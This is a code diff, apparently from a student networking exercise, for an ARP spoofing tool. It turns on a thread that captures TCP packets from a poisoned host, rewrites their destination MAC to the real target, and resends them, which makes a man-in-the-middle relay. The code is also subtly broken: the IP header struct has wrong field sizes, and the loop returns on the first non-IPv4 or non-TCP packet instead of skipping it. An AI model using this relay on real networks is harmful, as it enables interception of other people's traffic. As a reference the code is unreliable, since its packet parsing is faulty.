@@ -27,7 +27,16 @@ struct EthArpPacket final {
 
 struct IpHdr final
 {
-
+    uint8_t version;
+    uint8_t typeofservice;
+    uint16_t toal_len;
+    uint8_t id;
+    uint16_t frag_off;
+    uint8_t livetime;
+    uint8_t protocol;
+    uint16_t checksum;
+    Ip s_addr;
+    Ip d_addr;
 };
 #pragma pack(pop)
 
@@ -172,10 +181,15 @@ public:
     void process_work_que() {
         std::thread spoofing_thread(&arp_spoofing::send_spoofing, this);
         std::thread listening_thread(&arp_spoofing::capture_and_push_work_que, this);
-        //std::thread tcp_capture_and_replay_thread(&arp_spoofing::tcp_capture_and_replay, this);
-        spoofing_thread.join();
-        listening_thread.join();
-        //tcp_catpture_and_replay_thread.join();
+        std::thread tcp_capture_and_replay_thread(&arp_spoofing::tcp_capture_and_replay, this);
+        spoofing_thread.detach();
+        listening_thread.detach();
+        tcp_capture_and_replay_thread.detach();
+        while(true){
+            char q = getchar();
+            if(q == 'q')
+                return;
+        }
     }
 
 private:
@@ -238,7 +252,7 @@ private:
             }
         }
     }
-    /*
+    
     void tcp_capture_and_replay() {
         struct pcap_pkthdr* header;
         const u_char* packet_data;
@@ -249,15 +263,31 @@ private:
                 continue;
             }
             EthHdr* eth = (EthHdr*)packet_data;
-            if (eth->type() == EthHdr::Ip4) {
-                IpHdr* ip = (IpHdr*)(packet_data + sizeof(EthHdr));
-                if (ip->p_ == IPPROTO_TCP) {
-                    TcpHdr* tcp = (TcpHdr*)(packet_data + sizeof(EthHdr) + ip->h_len() * 4);
-                    pcap_sendpacket(handle, packet_data, header->caplen);
+            if (eth->type() != EthHdr::Ip4) {
+                return;
+            }   
+            
+            IpHdr* ip = (IpHdr*)(packet_data + sizeof(EthHdr));
+
+            Ip s_ip = ntohl(ip->s_addr);
+            Ip d_ip = ntohl(ip->d_addr);
+
+            if (ip->protocol != IPPROTO_TCP)
+                return;
+            /*&& ip->s_addr == sender중 하나, ip->d_addr == sender의 target중 하나일 때*/
+            //이더넷헤더의 dmac을 target의 mac으로 변경하여 tcp 전송
+            auto it = sender_to_target.find(s_ip);
+            if (it != sender_to_target.end() && it->second == d_ip) {
+                Mac target_mac = sender_mac_list[it->second];
+
+                eth->dmac_ = target_mac;
+
+                if (pcap_sendpacket(handle, packet_data, header->caplen) != 0) {
+                    fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(handle));
                 }
             }
         }
-    }*/
+    }
 };
 
 int main(int argc, char* argv[]) {
